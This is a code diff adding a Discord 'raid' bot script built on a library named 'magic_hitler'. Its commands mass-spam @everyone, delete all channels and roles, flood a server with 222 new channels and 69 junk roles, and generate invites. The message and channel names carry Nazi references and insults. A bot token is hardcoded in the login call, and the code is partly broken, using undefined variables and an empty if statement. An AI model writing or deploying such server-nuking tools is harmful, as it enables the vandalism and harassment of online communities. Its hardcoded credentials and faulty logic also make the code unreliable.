@@ -1,0 +1,49 @@
+const Discord = require('discord.js');
+const MagicHitler = require('magic_hitler');
+const client = new Discord.Client();
+const raid = new MagicHitler.Client({
+    client: client,
+    prefix: "!"
+});
+
+let messageArray = message.content.split(" ");
+let cmd = messageArray[0];
+let args = messageArray.slice(1);
+
+if (cmd === prefix + "oof")
+
+raid.ready();
+
+raid.sendMessage("Test réussi", "test");
+raid.spamMessages("@everyone Raid by $ad", "spam", {
+    messageNumber: 100,
+    allChannels: false
+});
+raid.spamMessage("@everyone Raid by $ad", "spamAllChannels", {
+    messageNumber: 20,
+    allChannels: true
+});    
+
+raid.deleteChannel("del");
+raid.deleteChannels("delAll", {
+    createChannel: true,
+    createdChannelName: "raid-by-magic-hitler",
+    createChannelMessage: "@everyone Raid by Hitler lpb de tous les $ad's"
+});
+raid.createChannels("create", {
+    createChannelName: "magic-hitler",
+    sendMessageContent: "@everyone Raid by $ad",
+    sendMessageCount: 3,
+    createChannelCount: 222
+});
+raid.createInvite("invite", false);
+raid.createInvite("inviteall", true);
+
+raid.deleteRoles("delRoles");
+raid.createRoles("createRoles", {
+    rolesNumber: 69,
+    rolesName: "BZ PAR LE MAJESTIEUX $ad"
+});
+
+client.login('NjQ3ODcxODE0MDA1MTYyMDA2.XeIzew.UxqhfckgdurLIsbBg4z-9r89UUw');
+
